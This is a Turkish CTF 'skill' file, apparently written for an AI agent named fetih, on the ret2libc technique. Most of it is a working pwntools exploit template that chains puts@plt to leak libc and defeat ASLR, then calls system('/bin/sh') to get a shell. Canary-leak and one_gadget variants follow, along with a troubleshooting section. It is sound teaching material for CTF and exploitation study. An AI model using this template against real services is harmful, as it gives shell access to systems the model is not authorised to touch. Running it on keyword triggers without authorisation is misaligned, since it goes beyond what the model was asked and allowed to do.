---
name: ret2libc
description: NX açık, ASLR varsa libc leak + system("/bin/sh") zinciri
tags: [ctf, pwn, ret2libc, rop, libc-leak, system, plt, got, aslr-bypass]
triggers:
  - "NX enabled"
  - "ASLR açık"
  - "libc leak"
  - "puts@plt"
  - "system /bin/sh"
  - "return to libc"
  - "got overwrite"
  - "64-bit binary"
difficulty: medium
category: pwn
solved_challenges:
  - "DiceCTF 2024 - baby-talk (off-by-one + libc leak)"
  - "Google CTF 2023 - write-flag-where"
adapted_for: fetih
---

# Ret2Libc — NX + ASLR Bypass

## Ne Zaman Kullan

`checksec` çıktısında şunu görürsen bu teknik devreye girer:

```
    Arch:     amd64-64-little
    RELRO:    Partial RELRO       ← GOT yazılabilir
    Stack:    No canary found     ← ya da canary var ama leak var
    NX:       NX enabled          ← shellcode çalışmaz, ROP lazım
    PIE:      No PIE              ← binary adresleri sabit (işimizi kolaylaştırır)
    ASLR:     Enabled             ← libc adresi her run'da değişir → leak şart
```

Genel kural:
- **NX enabled + No PIE + Partial RELRO** → klasik ret2libc, puts@plt ile GOT leak yap
- **NX enabled + PIE enabled** → binary leak de gerekir, daha zor
- **Full RELRO** → GOT overwrite olmaz, sadece read; libc leak yine mümkün

---

## 2-Stage ROP: Libc Leak → Shell

### Aşama 1: Libc Adresini Sızdır

ROP zinciri: `puts@plt(puts@got)` → `main()` (ikinci şans)

puts, got'taki kendi adresini stdout'a basar. Biz bu adresi okur,
libc base'i hesaplar, ikinci payload ile `system("/bin/sh")` çağırırız.

```
[padding] [pop rdi; ret] [puts@got] [puts@plt] [main]
```

### Aşama 2: Shell Al

```
[padding] [ret gadget] [pop rdi; ret] [/bin/sh str] [system]
```

`ret` gadget'i stack alignment içindir (x86_64'te `movaps` 16-byte hizalama ister).

---

## Tam pwntools Şablonu (64-bit)

```python
#!/usr/bin/env python3
# ret2libc_exploit.py — 64-bit NX+ASLR bypass
# Kullanım: python3 exploit.py [LOCAL|REMOTE] [host] [port]

from pwn import *

# ── Hedef ayarları ──────────────────────────────────────────────────────────
BINARY  = "./vuln"          # binary yolu
LIBC    = "./libc.so.6"     # ldd ile bul ya da patchelf ile çek
REMOTE_HOST = "chall.ctf.site"
REMOTE_PORT = 1337

context.binary = elf = ELF(BINARY)
libc = ELF(LIBC)
context.log_level = "info"   # debug için "debug"

# ── Bağlantı ────────────────────────────────────────────────────────────────
def start():
    if args.REMOTE:
        return remote(REMOTE_HOST, REMOTE_PORT)
    return process(BINARY)

io = start()

# ── Gadget + Sembol Adresleri ────────────────────────────────────────────────
rop = ROP(elf)

POP_RDI = rop.find_gadget(["pop rdi", "ret"])[0]
RET     = rop.find_gadget(["ret"])[0]          # stack alignment için

PUTS_PLT = elf.plt["puts"]
PUTS_GOT = elf.got["puts"]
MAIN     = elf.symbols["main"]

log.info(f"pop rdi; ret  @ {hex(POP_RDI)}")
log.info(f"puts@plt      @ {hex(PUTS_PLT)}")
log.info(f"puts@got      @ {hex(PUTS_GOT)}")
log.info(f"main          @ {hex(MAIN)}")

# ── Offset Bul ──────────────────────────────────────────────────────────────
# cyclic_find ile ya da gdb pwndbg'de: cyclic 200 → crash → cyclic_find(rbp)
OFFSET = 72   # <-- bunu kendi binary'ne göre değiştir

# ── Stage 1: Libc Leak ───────────────────────────────────────────────────────
payload1  = b"A" * OFFSET
payload1 += p64(POP_RDI)
payload1 += p64(PUTS_GOT)
payload1 += p64(PUTS_PLT)
payload1 += p64(MAIN)       # leak sonrası main'e dön

io.recvuntil(b">>> ")       # programa özel prompt; gerekirse değiştir
io.sendline(payload1)

# puts çıktısını oku
leaked_bytes = io.recvline().strip().ljust(8, b"\x00")
puts_addr    = u64(leaked_bytes[:8])
log.success(f"puts@libc = {hex(puts_addr)}")

# ── Libc Base Hesapla ────────────────────────────────────────────────────────
libc.address  = puts_addr - libc.symbols["puts"]
log.success(f"libc base = {hex(libc.address)}")

SYSTEM   = libc.symbols["system"]
BIN_SH   = next(libc.search(b"/bin/sh\x00"))
log.info(f"system    @ {hex(SYSTEM)}")
log.info(f"/bin/sh   @ {hex(BIN_SH)}")

# ── Stage 2: Shell ───────────────────────────────────────────────────────────
payload2  = b"A" * OFFSET
payload2 += p64(RET)          # 16-byte stack hizalama (movaps için)
payload2 += p64(POP_RDI)
payload2 += p64(BIN_SH)
payload2 += p64(SYSTEM)

io.recvuntil(b">>> ")
io.sendline(payload2)

io.interactive()
```

---

## ASLR Offset Hesaplama

```python
# Leak aldıktan sonra libc base:
libc.address = leaked_addr - libc.symbols["leaked_func"]

# Doğrulama — her zaman 0x...000 ile bitmeli:
assert libc.address & 0xfff == 0, "Yanlış libc versiyonu!"

# one_gadget ile alternatif:
# $ one_gadget libc.so.6
# 0xe3b01 execve("/bin/sh", r15, rdx)   constraints: [r15 == NULL, rdx == NULL]
ONE_GADGET = libc.address + 0xe3b01
```

---

## Gerçek Örnek: DiceCTF 2024 — baby-talk

Binary `talk()` fonksiyonunda off-by-one ile RBP'yi kısmen kontrol ediyordu.
Akış:

1. **Off-by-one** → stack'te `puts@got` adresine pointer yaz
2. **İlk ROP** → `puts@plt(puts@got)` ile libc base hesapla
3. **İkinci ROP** → `system("/bin/sh")` çağır

```python
# baby-talk'a özel snippet
CANARY_OFF  = 31   # %31$p ile stack canary leak (printf zafiyeti de vardı)
OFFSET      = 40

# Canary leak (format string yardımcı vuln)
io.sendline(b"%31$p")
canary = int(io.recvline().strip(), 16)
log.success(f"canary = {hex(canary)}")

payload  = b"A" * OFFSET
payload += p64(canary)     # canary koru
payload += b"B" * 8       # saved rbp
payload += p64(POP_RDI) + p64(PUTS_GOT) + p64(PUTS_PLT) + p64(MAIN)
```

---

## Tuzaklar

### 1. Stack Alignment (movaps crash)
`system()` içinde SSE talimatları 16-byte hizalı stack ister.
Çözüm: payload'a fazladan `ret` gadget ekle.

```python
# Hatalı:
payload = padding + p64(POP_RDI) + p64(BIN_SH) + p64(SYSTEM)

# Doğru:
payload = padding + p64(RET) + p64(POP_RDI) + p64(BIN_SH) + p64(SYSTEM)
```

### 2. Yanlış Libc Versiyonu
```bash
# Binary'nin kullandığı libc'yi bul:
ldd ./vuln
# /lib/x86_64-linux-gnu/libc.so.6 (0x00007f...)

# Sunucudaki versiyonu anlamak için leak ettikten sonra:
# libc.blukat.me sitesine puts offset'ini gir
# ya da libc-database kullan:
# $ ./find puts <leaked_offset>
```

### 3. puts Yetersiz Geldiğinde
Bazen `puts` GOT'ta yok. Alternatifler:
- `write@plt(1, write@got, 8)` → pop rdi + pop rsi + pop rdx gerekir
- `printf@plt(printf@got)` → format string riski (null byte sorunları)
- `__libc_start_main@got` → neredeyse her binary'de var

### 4. Null Byte Kesme
`puts()` null byte'ta durur. Leaked adres null içeriyorsa:
```python
# Güvenli okuma:
leak = io.recv(6).ljust(8, b"\x00")   # 48-bit adres için
addr = u64(leak)
```

### 5. one_gadget Başarısız
`one_gadget` constraint'leri karşılanmıyorsa:
```bash
one_gadget libc.so.6 -l 2   # daha fazla gadget listele
```
Ya da klasik `system("/bin/sh")` zincirini kullan.

<!--
  ⚔ Bu skill FETIH AI Agent icin gelistirilmistir — https://github.com/MustafaKemal0146/fetih
  Yetkisiz kullanim/kopyalama tespit edilebilir.
  hash: 20d8b28c92c5c721
-->

